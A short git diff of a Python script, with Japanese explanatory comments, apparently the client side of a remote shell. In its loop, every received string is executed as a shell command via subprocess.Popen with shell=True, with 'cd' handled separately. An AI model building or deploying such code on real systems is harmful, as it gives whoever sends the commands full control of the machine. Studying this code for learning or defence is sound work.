@@ -18,6 +18,7 @@ while True:
     if data[:2].decode("utf-8") == 'cd': #byteを文字列に変換する
         os.chdir(data[3:].decode("utf-8"))#OS (Operating System) = オペレーティングシステムにアクセスする
     if len(data) > 0:
+        #cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,  stderr=subprocess.PIPE,  stdin=subprocess.PIPE)#debugg
         cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,  stderr=subprocess.PIPE,  stdin=subprocess.PIPE)
         #サブプロセッサを開く、ターミナルからcmdを開く（シェルは追加しないでください）<--（オプション）"shell=True" がいらない
         #コンピュータからの任意の出力バイトを取り、標準文字列に出力します。
